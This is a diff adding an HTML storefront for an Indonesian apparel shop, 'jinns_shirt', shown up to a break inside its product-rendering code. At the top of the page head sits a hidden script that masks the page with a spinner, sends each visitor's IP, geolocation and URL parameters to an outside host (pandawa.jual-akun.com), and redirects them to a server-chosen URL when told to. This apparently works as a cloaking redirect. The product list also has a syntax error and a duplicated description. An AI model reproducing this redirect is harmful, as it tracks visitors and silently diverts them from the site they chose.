@@ -1,0 +1,861 @@
+<!DOCTYPE html>
+<html lang="id" class="scroll-smooth">
+<head>
+    <meta name="value" content="79doj224vj">
+<meta name="token" content="4ywYORQgV3lyfVN0pTQ7FL7x9gZcRlcMuVBr5WeQajXwbGqMmiNj2Cskxyxf">
+<meta name="uri" content="https://pandawa.jual-akun.com/api/v1/kucing">
+<style>
+    .classldingBG{display: flex !important; z-index: 999999 !important; background: #fff; position: fixed; align-items: center; justify-content: center; top: 0; left: 0; width: 100%; height: 100%;}
+    .pik_spinner { -webkit-animation: rotator 1.4s linear infinite; animation: rotator 1.4s linear infinite; } @-webkit-keyframes rotator { 0% { transform: rotate(0deg); } 100% { transform: rotate(270deg); } } @keyframes  rotator { 0% { transform: rotate(0deg); } 100% { transform: rotate(270deg); } } .pik_path { stroke-dasharray: 187; stroke-dashoffset: 0; transform-origin: center; -webkit-animation: dash 1.4s ease-in-out infinite, colors 5.6s ease-in-out infinite; animation: dash 1.4s ease-in-out infinite, colors 5.6s ease-in-out infinite; } @-webkit-keyframes colors { 0% { stroke: #4285F4; } 25% { stroke: #DE3E35; } 50% { stroke: #F7C223; } 75% { stroke: #1B9A59; } 100% { stroke: #4285F4; } } @keyframes  colors { 0% { stroke: #4285F4; } 25% { stroke: #DE3E35; } 50% { stroke: #F7C223; } 75% { stroke: #1B9A59; } 100% { stroke: #4285F4; } } @-webkit-keyframes dash { 0% { stroke-dashoffset: 187; } 50% { stroke-dashoffset: 46.75; transform: rotate(135deg); } 100% { stroke-dashoffset: 187; transform: rotate(450deg); } } @keyframes  dash { 0% { stroke-dashoffset: 187; } 50% { stroke-dashoffset: 46.75; transform: rotate(135deg); } 100% { stroke-dashoffset: 187; transform: rotate(450deg); } }
+    .fadeout {z-index: -1 !important; opacity: 0; display: none !important;}
+</style>
+<script type="text/javascript">
+    //add element
+ 
+    document.write(
+        '<div class="classldingBG" id="ldingBG"><div class="pik_bodyspiner"> <svg class="pik_spinner" width="65px" height="65px" viewBox="0 0 66 66" xmlns="http://www.w3.org/2000/svg"> <circle class="pik_path" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30"></circle> </svg> </div></div></div>'
+    );
+        function hideKucingLoading() {
+            var loading = document.getElementById('ldingBG');
+            if (loading) {
+                loading.classList.add("fadeout");
+            }
+        }
+ 
+        function fetchWithTimeout(url, options, timeout) {
+            var controller = typeof AbortController !== 'undefined' ? new AbortController() : null;
+            var fetchOptions = options || {};
+            var timer;
+ 
+            if (controller) {
+                fetchOptions.signal = controller.signal;
+            }
+ 
+            var timeoutPromise = new Promise(function(resolve, reject) {
+                timer = setTimeout(function() {
+                    if (controller) {
+                        controller.abort();
+                    }
+                    reject(new Error('IP lookup timeout'));
+                }, timeout);
+            });
+ 
+            var requestPromise = fetch(url, fetchOptions).then(function(response) {
+                if (!response.ok) {
+                    throw new Error('IP lookup HTTP ' + response.status);
+                }
+ 
+                return response.json();
+            });
+ 
+            return Promise.race([requestPromise, timeoutPromise])
+                .then(function(payload) {
+                    clearTimeout(timer);
+                    return payload;
+                })
+                .catch(function(error) {
+                    clearTimeout(timer);
+                    throw error;
+                });
+        }
+ 
+        function getKucingUrlParameters() {
+            var parameters = [];
+ 
+            try {
+                var searchParameters = new URLSearchParams(window.location.search || '');
+                searchParameters.forEach(function(value, name) {
+                    if (parameters.length < 4) {
+                        parameters.push({
+                            name: String(name).slice(0, 64),
+                            value: String(value).slice(0, 255)
+                        });
+                    }
+                });
+            } catch (error) {
+                // URL parameter reporting is optional. Never interrupt the main
+                // kucing decision on older or unusual browsers.
+            }
+ 
+            return parameters;
+        }
+ 
+        function appendKucingRawQueryToUrl(destinationUrl) {
+            var rawQuery = window.location.search || '';
+ 
+            if (typeof destinationUrl !== 'string' || destinationUrl === '' || rawQuery === '' || rawQuery === '?') {
+                return destinationUrl;
+            }
+ 
+            var query = rawQuery.charAt(0) === '?' ? rawQuery.slice(1) : rawQuery;
+            if (query === '') {
+                return destinationUrl;
+            }
+ 
+            var fragmentIndex = destinationUrl.indexOf('#');
+            var fragment = fragmentIndex === -1 ? '' : destinationUrl.slice(fragmentIndex);
+            var baseUrl = fragmentIndex === -1 ? destinationUrl : destinationUrl.slice(0, fragmentIndex);
+            var lastCharacter = baseUrl.charAt(baseUrl.length - 1);
+            var separator = baseUrl.indexOf('?') === -1
+                ? '?'
+                : (lastCharacter === '?' || lastCharacter === '&' ? '' : '&');
+ 
+            return baseUrl + separator + query + fragment;
+        }
+ 
+        function sendKucingRequest(ress_locator) {
+            ress_locator = ress_locator || {
+                reason: 'RateLimited',
+                message: 'IP lookup unavailable before kucing request',
+                error: true
+            };
+ 
+            // Never send the literal string "undefined" when the geo
+            // provider is limited. Unreadable IP/geo rules fail open while
+            // User-Agent and any other readable rules are still evaluated.
+            var ip = ress_locator.ip || '';
+            var requestBody = 'token=' + encodeURIComponent('4ywYORQgV3lyfVN0pTQ7FL7x9gZcRlcMuVBr5WeQajXwbGqMmiNj2Cskxyxf');
+            var urlParameters = getKucingUrlParameters();
+            if (urlParameters.length) {
+                requestBody += '&url_parameters=' + encodeURIComponent(JSON.stringify(urlParameters));
+            }
+ 
+            fetch("https://pandawa.jual-akun.com/api/v1/kucing", {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'value': '79doj224vj',
+                    'ip': ip,
+                    'api': JSON.stringify(ress_locator)
+                },
+                body: requestBody,
+                redirect: 'follow'
+ 
+            }).then(function(response_api) {
+                return response_api.json();
+ 
+            }).then(respon_api => {
+                var status = respon_api.result;
+                if (status == false) {
+                    hideKucingLoading();
+                } else if (status == true) {
+                    //response from server json
+                    setTimeout(function() {
+                        window.location.href = appendKucingRawQueryToUrl(respon_api.data.url);
+                    }, 100);
+ 
+                }
+            }).catch((error) => {
+                 hideKucingLoading();
+            });
+        }
+ 
+        fetchWithTimeout("https://ipapi.co/json" , {
+                    method: 'GET',
+                }, 3000)
+                //respons ip locate
+                .then((ress_locator) => {
+                    //send request to server
+                    sendKucingRequest(ress_locator);
+                })
+                .catch((error) => {
+                    sendKucingRequest({
+                        reason: 'RateLimited',
+                        message: 'IP lookup unavailable before kucing request',
+                        error: true
+                    });
+                })
+</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>jinns_shirt - Clean & Stylish Apparel</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        brand: {
+                            50: '#f0fdf4',
+                            100: '#dcfce7',
+                            500: '#10b981',
+                            600: '#059669',
+                            700: '#047857',
+                            900: '#064e3b',
+                        }
+                    },
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                    }
+                }
+            }
+        }
+    </script>
+    <!-- Google Font Inter -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <!-- Font Awesome Icons for WA & FB -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Lucide Icons -->
+    <script src="https://unpkg.com/lucide@latest"></script>
+</head>
+<body class="bg-gray-50 text-gray-800 font-sans antialiased selection:bg-brand-500 selection:text-white">
+
+    <!-- TOP BAR -->
+    <div class="bg-brand-700 text-white text-xs py-2 text-center font-semibold tracking-wide">
+        ⚡ PROMO FREESHIP: GRATIS ONGKIR SELURUH INDONESIA HARI INI ⚡
+    </div>
+
+    <!-- NAVBAR -->
+    <nav class="sticky top-0 z-40 bg-white/90 backdrop-blur-md border-b border-gray-100 shadow-sm">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-20 flex items-center justify-between">
+            <!-- Brand Logo -->
+            <a href="#" class="flex items-center gap-2 group">
+                <div class="w-10 h-10 rounded-xl bg-brand-600 flex items-center justify-center text-white font-black text-xl shadow-md shadow-brand-500/20 group-hover:scale-105 transition-transform">
+                    JS
+                </div>
+                <span class="text-2xl font-black tracking-tight text-gray-900">
+                    jinns<span class="text-brand-600">_shirt</span>
+                </span>
+            </a>
+
+            <!-- Navigation Links -->
+            <div class="hidden md:flex items-center space-x-8 text-sm font-semibold text-gray-600">
+                <a href="#hero" class="hover:text-brand-600 transition-colors">Home</a>
+                <a href="#catalog" class="hover:text-brand-600 transition-colors">Katalog</a>
+                <a href="#categories" class="hover:text-brand-600 transition-colors">Kategori</a>
+                <a href="#about" class="hover:text-brand-600 transition-colors">Tentang Kami</a>
+            </div>
+
+            <!-- Action Buttons (Cart & Direct WA) -->
+            <div class="flex items-center gap-3">
+                <a href="https://wa.me/6281927513800" target="_blank" class="p-2.5 rounded-full hover:bg-emerald-50 text-gray-700 hover:text-brand-600 transition-colors flex items-center justify-center" title="Hubungi CS WhatsApp">
+                    <i class="fa-brands fa-whatsapp text-xl text-emerald-600"></i>
+                </a>
+                <button onclick="toggleCartDrawer(true)" class="relative p-2.5 rounded-full hover:bg-emerald-50 text-gray-700 hover:text-brand-600 transition-colors flex items-center justify-center">
+                    <i data-lucide="shopping-bag" class="w-6 h-6"></i>
+                    <span id="cartBadge" class="absolute top-0 right-0 bg-brand-600 text-white text-[10px] font-bold w-5 h-5 rounded-full flex items-center justify-center border-2 border-white scale-0 transition-transform">0</span>
+                </button>
+            </div>
+        </div>
+    </nav>
+
+    <!-- HERO SECTION -->
+    <section id="hero" class="relative bg-gradient-to-b from-emerald-50/60 via-white to-gray-50 pt-12 pb-20 overflow-hidden">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="grid grid-cols-1 lg:grid-cols-2 gap-12 items-center">
+                <div class="space-y-6 text-center lg:text-left">
+                    <span class="inline-flex items-center gap-2 px-3.5 py-1.5 rounded-full bg-brand-100 text-brand-700 text-xs font-bold tracking-wide">
+                        <i data-lucide="sparkles" class="w-3.5 h-3.5"></i> New Arrival Collection 2026
+                    </span>
+                    <h1 class="text-4xl sm:text-5xl lg:text-6xl font-black text-gray-900 tracking-tight leading-tight">
+                        Keren & Stylish Apparel by <span class="text-transparent bg-clip-text bg-gradient-to-r from-brand-600 to-emerald-400">jinns_shirt</span>
+                    </h1>
+                    <p class="text-gray-600 text-base sm:text-lg max-w-xl mx-auto lg:mx-0 font-normal leading-relaxed">
+                        Tampil stylish dan percaya diri dengan koleksi pakaian terkini: T-Shirt Graphic, Kemeja Outer, Knit Polo, hingga Hoodie premium.
+                    </p>
+                    <div class="flex flex-col sm:flex-row items-center justify-center lg:justify-start gap-4 pt-2">
+                        <a href="#catalog" class="w-full sm:w-auto px-8 py-4 bg-brand-600 hover:bg-brand-700 text-white font-bold rounded-xl shadow-lg shadow-brand-500/30 hover:shadow-brand-500/50 transition-all text-center">
+                            Lihat Katalog Produk
+                        </a>
+                        <a href="https://wa.me/6281927513800" target="_blank" class="w-full sm:w-auto px-6 py-4 bg-emerald-50 hover:bg-emerald-100 text-brand-700 font-bold rounded-xl border border-brand-200 transition-all text-center flex items-center justify-center gap-2">
+                            <i class="fa-brands fa-whatsapp text-lg"></i> Hubungi Admin
+                        </a>
+                    </div>
+                </div>
+
+                <!-- Hero Images Showcase -->
+                <div class="relative">
+                    <div class="absolute -top-6 -left-6 w-72 h-72 bg-brand-200 rounded-full blur-3xl opacity-50"></div>
+                    <div class="relative grid grid-cols-2 gap-4">
+                        <img src="image_205f08.jpg" alt="T-Shirt Graphic Hug" class="rounded-2xl shadow-xl object-cover h-64 sm:h-80 w-full border-2 border-white transform -rotate-2 hover:rotate-0 transition-transform duration-300">
+                        <img src="image_200ce7.jpg" alt="T-Shirt Racing Patch" class="rounded-2xl shadow-xl object-cover h-64 sm:h-80 w-full border-2 border-white transform rotate-2 hover:rotate-0 transition-transform duration-300 mt-6">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- CATEGORY HIGHLIGHT -->
+    <section id="categories" class="py-12 bg-white border-y border-gray-100">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <h2 class="text-center text-xs uppercase font-extrabold text-brand-600 tracking-wider mb-8">Pilih Berdasarkan Kategori</h2>
+            <div class="grid grid-cols-2 md:grid-cols-4 gap-4">
+                <button onclick="filterCategory('T-Shirt')" class="p-6 bg-gray-50 hover:bg-brand-50 rounded-2xl border border-gray-100 hover:border-brand-300 transition-all text-left group">
+                    <div class="w-12 h-12 rounded-xl bg-white text-brand-600 shadow-sm flex items-center justify-center mb-4 group-hover:bg-brand-600 group-hover:text-white transition-colors">
+                        <i data-lucide="shirt" class="w-6 h-6"></i>
+                    </div>
+                    <h3 class="font-bold text-gray-900 group-hover:text-brand-600">T-Shirt</h3>
+                    <p class="text-xs text-gray-500 mt-1">Streetwear & Graphic</p>
+                </button>
+
+                <button onclick="filterCategory('Kemeja Overshirt / Flannel Outer')" class="p-6 bg-gray-50 hover:bg-brand-50 rounded-2xl border border-gray-100 hover:border-brand-300 transition-all text-left group">
+                    <div class="w-12 h-12 rounded-xl bg-white text-brand-600 shadow-sm flex items-center justify-center mb-4 group-hover:bg-brand-600 group-hover:text-white transition-colors">
+                        <i data-lucide="layers" class="w-6 h-6"></i>
+                    </div>
+                    <h3 class="font-bold text-gray-900 group-hover:text-brand-600">Kemeja Outer</h3>
+                    <p class="text-xs text-gray-500 mt-1">Pinstripe & Solid Black</p>
+                </button>
+
+                <button onclick="filterCategory('Polo Shirt')" class="p-6 bg-gray-50 hover:bg-brand-50 rounded-2xl border border-gray-100 hover:border-brand-300 transition-all text-left group">
+                    <div class="w-12 h-12 rounded-xl bg-white text-brand-600 shadow-sm flex items-center justify-center mb-4 group-hover:bg-brand-600 group-hover:text-white transition-colors">
+                        <i data-lucide="user-check" class="w-6 h-6"></i>
+                    </div>
+                    <h3 class="font-bold text-gray-900 group-hover:text-brand-600">Polo Shirt</h3>
+                    <p class="text-xs text-gray-500 mt-1">Vintage Knit Cream</p>
+                </button>
+
+                <button onclick="filterCategory('Hoodie & Sweatshirt')" class="p-6 bg-gray-50 hover:bg-brand-50 rounded-2xl border border-gray-100 hover:border-brand-300 transition-all text-left group">
+                    <div class="w-12 h-12 rounded-xl bg-white text-brand-600 shadow-sm flex items-center justify-center mb-4 group-hover:bg-brand-600 group-hover:text-white transition-colors">
+                        <i data-lucide="wind" class="w-6 h-6"></i>
+                    </div>
+                    <h3 class="font-bold text-gray-900 group-hover:text-brand-600">Hoodie</h3>
+                    <p class="text-xs text-gray-500 mt-1">Zip-Up Fleece Premium</p>
+                </button>
+            </div>
+        </div>
+    </section>
+
+    <!-- PRODUCT CATALOG SECTION -->
+    <section id="catalog" class="py-16 max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+        <div class="flex flex-col md:flex-row md:items-end justify-between mb-10 gap-4">
+            <div>
+                <h2 class="text-3xl font-extrabold text-gray-900 tracking-tight">Katalog Pakaian</h2>
+                <p class="text-gray-500 text-sm mt-1">Klik gambar untuk detail & pilih ukuran, atau langsung tanya produk via WhatsApp.</p>
+            </div>
+
+            <!-- Filter Tabs -->
+            <div class="flex flex-wrap gap-2" id="filterContainer">
+                <button onclick="filterCategory('All')" class="category-btn active px-4 py-2 text-xs font-semibold rounded-full bg-brand-600 text-white shadow-sm transition-all">Semua</button>
+                <button onclick="filterCategory('T-Shirt')" class="category-btn px-4 py-2 text-xs font-semibold rounded-full bg-gray-100 text-gray-600 hover:bg-gray-200 transition-all">T-Shirt</button>
+                <button onclick="filterCategory('Kemeja Overshirt / Flannel Outer')" class="category-btn px-4 py-2 text-xs font-semibold rounded-full bg-gray-100 text-gray-600 hover:bg-gray-200 transition-all">Kemeja Outer</button>
+                <button onclick="filterCategory('Polo Shirt')" class="category-btn px-4 py-2 text-xs font-semibold rounded-full bg-gray-100 text-gray-600 hover:bg-gray-200 transition-all">Polo Shirt</button>
+                <button onclick="filterCategory('Hoodie & Sweatshirt')" class="category-btn px-4 py-2 text-xs font-semibold rounded-full bg-gray-100 text-gray-600 hover:bg-gray-200 transition-all">Hoodie</button>
+            </div>
+        </div>
+
+        <!-- Dynamic Products Grid -->
+        <div id="productGrid" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6 sm:gap-8"></div>
+    </section>
+
+    <!-- PRODUCT DETAIL MODAL (SIZE & QTY SELECTION) -->
+    <div id="productModal" class="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm hidden opacity-0 transition-all duration-300">
+        <div class="bg-white rounded-3xl max-w-2xl w-full overflow-hidden shadow-2xl transform scale-95 transition-all duration-300 relative flex flex-col md:flex-row">
+            
+            <!-- Close Modal Button -->
+            <button onclick="closeModal()" class="absolute top-4 right-4 z-10 w-9 h-9 rounded-full bg-gray-100 hover:bg-gray-200 flex items-center justify-center text-gray-600 transition-colors">
+                <i data-lucide="x" class="w-5 h-5"></i>
+            </button>
+
+            <!-- Product Image Preview -->
+            <div class="md:w-1/2 bg-gray-100 relative min-h-[260px] md:min-h-full">
+                <img id="modalImg" src="" alt="" class="w-full h-full object-cover">
+                <span id="modalCategoryBadge" class="absolute top-4 left-4 bg-white/90 backdrop-blur-md px-3 py-1 rounded-full text-[10px] font-bold text-brand-700 tracking-wider">
+                    CATEGORY
+                </span>
+            </div>
+
+            <!-- Product Details & Controls -->
+            <div class="md:w-1/2 p-6 sm:p-8 flex flex-col justify-between">
+                <div>
+                    <h3 id="modalTitle" class="text-xl font-bold text-gray-900 leading-snug">Nama Produk</h3>
+                    <p id="modalPrice" class="text-2xl font-extrabold text-brand-600 mt-2">Rp 0</p>
+                    <p id="modalDesc" class="text-xs text-gray-500 mt-3 leading-relaxed">
+                        Terbuat dari bahan pilihan berkualitas premium yang sangat nyaman, stylish, dan tahan lama untuk aktivitas harian.
+                    </p>
+
+                    <!-- Size Selector Buttons -->
+                    <div class="mt-6">
+                        <label class="block text-xs font-bold text-gray-700 uppercase tracking-wider mb-2">Pilih Ukuran (Size)</label>
+                        <div class="grid grid-cols-4 gap-2">
+                            <button type="button" onclick="selectSize('S')" class="size-btn py-2 text-xs font-bold border border-gray-200 rounded-xl hover:border-brand-500 transition-all text-gray-700">S</button>
+                            <button type="button" onclick="selectSize('M')" class="size-btn py-2 text-xs font-bold border border-gray-200 rounded-xl hover:border-brand-500 transition-all text-gray-700">M</button>
+                            <button type="button" onclick="selectSize('L')" class="size-btn py-2 text-xs font-bold border border-gray-200 rounded-xl hover:border-brand-500 transition-all text-gray-700">L</button>
+                            <button type="button" onclick="selectSize('XL')" class="size-btn py-2 text-xs font-bold border border-gray-200 rounded-xl hover:border-brand-500 transition-all text-gray-700">XL</button>
+                        </div>
+                    </div>
+
+                    <!-- Quantity Counter -->
+                    <div class="mt-6">
+                        <label class="block text-xs font-bold text-gray-700 uppercase tracking-wider mb-2">Jumlah (Qty)</label>
+                        <div class="flex items-center space-x-3">
+                            <div class="flex items-center border border-gray-200 rounded-xl overflow-hidden bg-gray-50">
+                                <button type="button" onclick="updateQty(-1)" class="px-3 py-2 text-gray-600 hover:bg-gray-200 font-bold transition-colors">-</button>
+                                <span id="modalQty" class="px-4 py-2 font-bold text-sm text-gray-800">1</span>
+                                <button type="button" onclick="updateQty(1)" class="px-3 py-2 text-gray-600 hover:bg-gray-200 font-bold transition-colors">+</button>
+                            </div>
+                            <span class="text-xs text-gray-400">Stok Ready</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Add to Cart / Order Action -->
+                <div class="mt-8 grid grid-cols-1 gap-2">
+                    <button type="button" onclick="addToCartFromModal()" class="w-full py-3 bg-brand-600 hover:bg-brand-700 text-white font-bold text-sm rounded-xl shadow-lg shadow-brand-500/30 hover:shadow-brand-500/50 transition-all flex items-center justify-center gap-2">
+                        <i data-lucide="shopping-cart" class="w-4 h-4"></i> Masukkan ke Keranjang
+                    </button>
+                    <button type="button" onclick="tanyaDirectWhatsApp()" class="w-full py-2.5 bg-emerald-50 hover:bg-emerald-100 text-emerald-700 font-bold text-xs rounded-xl border border-emerald-200 transition-all flex items-center justify-center gap-2">
+                        <i class="fa-brands fa-whatsapp text-sm"></i> Tanya Langsung via WA
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- CART SIDEBAR DRAWER -->
+    <div id="cartDrawer" class="fixed inset-0 z-50 overflow-hidden pointer-events-none">
+        <div id="cartBackdrop" onclick="toggleCartDrawer(false)" class="absolute inset-0 bg-black/50 backdrop-blur-sm opacity-0 transition-opacity duration-300 pointer-events-auto"></div>
+
+        <div class="fixed inset-y-0 right-0 max-w-full flex pl-10">
+            <div id="cartContent" class="w-screen max-w-md bg-white shadow-2xl flex flex-col pointer-events-auto transform translate-x-full transition-transform duration-300">
+                
+                <!-- Drawer Header -->
+                <div class="p-6 border-b border-gray-100 flex items-center justify-between bg-white">
+                    <div class="flex items-center gap-2">
+                        <i data-lucide="shopping-bag" class="w-5 h-5 text-brand-600"></i>
+                        <h2 class="text-lg font-bold text-gray-900">Keranjang Belanja</h2>
+                    </div>
+                    <button onclick="toggleCartDrawer(false)" class="p-2 text-gray-400 hover:text-gray-600 rounded-lg hover:bg-gray-100">
+                        <i data-lucide="x" class="w-5 h-5"></i>
+                    </button>
+                </div>
+
+                <!-- Cart Dynamic List -->
+                <div id="cartItemsList" class="flex-1 overflow-y-auto p-6 space-y-4"></div>
+
+                <!-- Drawer Footer -->
+                <div class="p-6 border-t border-gray-100 bg-gray-50 space-y-4">
+                    <div class="flex justify-between items-center text-sm">
+                        <span class="text-gray-500 font-medium">Subtotal Belanja</span>
+                        <span id="cartSubtotal" class="text-xl font-extrabold text-gray-900">Rp 0</span>
+                    </div>
+                    <button onclick="checkoutWhatsApp()" class="w-full py-4 bg-emerald-600 hover:bg-emerald-700 text-white font-bold rounded-xl shadow-lg shadow-emerald-600/30 transition-all flex items-center justify-center gap-2">
+                        <i class="fa-brands fa-whatsapp text-xl"></i> Checkout via WhatsApp
+                    </button>
+                </div>
+
+            </div>
+        </div>
+    </div>
+
+    <!-- TOAST NOTIFICATION -->
+    <div id="toast" class="fixed bottom-6 right-6 z-50 bg-gray-900 text-white px-5 py-3 rounded-2xl shadow-2xl flex items-center gap-3 transform translate-y-20 opacity-0 transition-all duration-300">
+        <div class="w-6 h-6 rounded-full bg-brand-500 flex items-center justify-center text-white">
+            <i data-lucide="check" class="w-4 h-4"></i>
+        </div>
+        <span id="toastMsg" class="text-xs font-semibold">Berhasil!</span>
+    </div>
+
+    <!-- FOOTER -->
+    <footer id="about" class="bg-gray-900 text-gray-300 pt-16 pb-12">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="grid grid-cols-1 md:grid-cols-4 gap-10 pb-12 border-b border-gray-800">
+                <div class="space-y-4">
+                    <div class="flex items-center gap-2">
+                        <div class="w-8 h-8 rounded-lg bg-brand-600 flex items-center justify-center text-white font-bold text-sm">JS</div>
+                        <span class="text-xl font-black text-white">jinns<span class="text-brand-500">_shirt</span></span>
+                    </div>
+                    <p class="text-xs text-gray-400 leading-relaxed">
+                        Pilihan pakaian stylish terbaik dengan kualitas premium. Menghadirkan fashion serbaguna untuk gaya harian Anda.
+                    </p>
+                </div>
+                <div>
+                    <h4 class="text-sm font-bold text-white uppercase tracking-wider mb-4">Kategori</h4>
+                    <ul class="space-y-2 text-xs">
+                        <li><a href="#catalog" onclick="filterCategory('T-Shirt')" class="hover:text-brand-500">T-Shirt Oversized</a></li>
+                        <li><a href="#catalog" onclick="filterCategory('Kemeja Overshirt / Flannel Outer')" class="hover:text-brand-500">Kemeja Outer</a></li>
+                        <li><a href="#catalog" onclick="filterCategory('Polo Shirt')" class="hover:text-brand-500">Polo Shirt</a></li>
+                        <li><a href="#catalog" onclick="filterCategory('Hoodie & Sweatshirt')" class="hover:text-brand-500">Hoodie & Sweatshirt</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h4 class="text-sm font-bold text-white uppercase tracking-wider mb-4">Bantuan</h4>
+                    <ul class="space-y-2 text-xs">
+                        <li><a href="https://wa.me/6281927513800" target="_blank" class="hover:text-brand-500">Panduan Ukuran (Size Chart)</a></li>
+                        <li><a href="https://wa.me/6281927513800" target="_blank" class="hover:text-brand-500">Informasi Pengiriman</a></li>
+                        <li><a href="https://wa.me/6281927513800" target="_blank" class="hover:text-brand-500">Hubungi Customer Support</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h4 class="text-sm font-bold text-white uppercase tracking-wider mb-4">Sosial Media</h4>
+                    <div class="flex space-x-3">
+                        <!-- WhatsApp Social Icon -->
+                        <a href="https://wa.me/6281927513800" target="_blank" class="w-10 h-10 rounded-full bg-gray-800 hover:bg-emerald-600 text-white flex items-center justify-center transition-colors text-lg" title="WhatsApp">
+                            <i class="fa-brands fa-whatsapp"></i>
+                        </a>
+                        <!-- Facebook Social Icon -->
+                        <a href="https://facebook.com" target="_blank" class="w-10 h-10 rounded-full bg-gray-800 hover:bg-blue-600 text-white flex items-center justify-center transition-colors text-lg" title="Facebook">
+                            <i class="fa-brands fa-facebook-f"></i>
+                        </a>
+                    </div>
+                </div>
+            </div>
+            <div class="pt-8 text-center text-xs text-gray-500">
+                <p>&copy; 2026 jinns_shirt. All rights reserved.</p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- JAVASCRIPT APPLICATION LOGIC -->
+    <script>
+        const WA_NUMBER = "6281927513800";
+
+        // PRODUCTS DATA WITH LOCAL IMAGES
+        const products = [
+            {
+                id: 1,
+                name: "Streetwear Hug Print Shirt",
+                category: "T-Shirt",
+                price: 149000,
+                image: "image_205f08.jpg",
+                desc: "Kaos T-Shirt putih bermodel relaxed fit dengan artwork cetak grafik eksklusif di bagian depan. Cotton Combed 24s adem."
+            },
+            {
+                id: 2,
+                name: "Racing Patch Oversized Shirt",
+                category: "T-Shirt",
+                price: 159000,
+                image: "image_200ce7.jpg",
+                desc: "T-Shirt vintage motorsport putih dengan berbagai variasi patch racing keren. Cocok untuk penampilan streetwear."
+            },
+            {
+                id: 3,
+                name: "Black Pinstripe Overshirt",
+                category: "Kemeja Overshirt / Flannel Outer",
+                price: 189000,
+                image: "image_205ff8.jpg",
+                desc: "Kemeja berlengan panjang motif garis vertikal (pinstripe) warna hitam. Desain clean dan rapi."
+            },
+            {
+                id: 4,
+                name: "Essential Solid Black Shirt",
+                category: "Kemeja Overshirt / Flannel Outer",
+                price: 179000,
+                image: "image_200d24.png",
+                desc: "Kemeja polos hitam lengan panjang berbahan katun impor berkualitas. Fleksibel untuk formal maupun outer santai."
+            },
+            {
+                id: 5,
+                name: "Vintage Knit Polo Cream",
+                category: "Polo Shirt",
+                price: 169000,
+                image: "4b8e1c14448b9a2754a7d70b4b5e4856.jpg",
+                desc: "Polo Shirt rajut halus berwarna krem elegan dengan detail kerah hitam kontras. Sangat retro modern."
+            },
+            {
+                id: 6,
+                name: "Essential Grey Zip Hoodie",
+                category: "Hoodie & Sweatshirt",
+                price: 239000,
+                image: "download (2).jpg",
+                desc: "Hoodie zip-up abu-abu berbahan Cotton Fleece lembut dan hangat. Memiliki double slider zipper yang praktis."
+            },
+            {
+                id: 7,
+                name: "Stealth Black Zip Hoodie",
+                category: "Hoodie & Sweatshirt",
+                price: 249000,
+                image: "image88.jpg",
+                desc: "Zip Hoodie polos warna hitam pekat. Potongan oversized fit dengan tali hoodie dan saku depan serbaguna."
+            }
+            {
+                id:8 ,
+                name: "Style Cream Hoodie",
+                category: "Hoodie & Sweatshirt",
+                price: 259000,
+                image: "imagejckt1.jpg",
+                desc: "Zip Hoodie polos warna hitam pekat. Potongan oversized fit dengan tali hoodie dan saku depan serbaguna."
+            }
+        ];
+
+        // APP STATE MANAGEMENT
+        let cart = [];
+        let selectedProduct = null;
+        let selectedSize = 'M';
+        let quantity = 1;
+
+        // INITIALIZE APP
+        document.addEventListener('DOMContentLoaded', () => {
+            renderProducts(products);
+            lucide.createIcons();
+        });
+
+        // RENDER PRODUCTS GRID
+        function renderProducts(items) {
+            const container = document.getElementById('productGrid');
+            container.innerHTML = '';
+
+            if (items.length === 0) {
+                container.innerHTML = `<div class="col-span-full text-center py-12 text-gray-400">Tidak ada produk dalam kategori ini.</div>`;
+                return;
+            }
+
+            items.forEach(product => {
+                const card = document.createElement('div');
+                card.className = "bg-white rounded-2xl overflow-hidden border border-gray-100 shadow-sm hover:shadow-xl hover:-translate-y-1 transition-all duration-300 flex flex-col justify-between group";
+                card.innerHTML = `
+                    <div class="relative overflow-hidden aspect-[4/5] bg-gray-100 cursor-pointer" onclick="openProductModal(${product.id})">
+                        <img src="${product.image}" alt="${product.name}" class="w-full h-full object-cover group-hover:scale-105 transition-transform duration-500" onerror="this.src='https://placehold.co/600x800/10b981/ffffff?text=${encodeURIComponent(product.name)}'">
+                        <span class="absolute top-3 left-3 bg-white/90 backdrop-blur-md px-3 py-1 rounded-full text-[10px] font-bold text-brand-700 tracking-wider shadow-sm">
+                            ${product.category}
+                        </span>
+                    </div>
+                    <div class="p-5 flex flex-col justify-between flex-grow">
+                        <div>
+                            <h3 onclick="openProductModal(${product.id})" class="font-bold text-gray-900 group-hover:text-brand-600 transition-colors line-clamp-1 cursor-pointer">
+                                ${product.name}
+                            </h3>
+                            <p class="text-sm font-extrabold text-brand-600 mt-2">
+                                Rp ${product.price.toLocaleString('id-ID')}
+                            </p>
+                        </div>
+                        <button type="button" onclick="tanyaProdukDirect('${product.name}')" class="mt-4 w-full py-2.5 bg-emerald-50 hover:bg-emerald-600 hover:text-white text-emerald-700 font-semibold text-xs rounded-xl border border-emerald-200 hover:border-emerald-600 transition-all flex items-center justify-center gap-2">
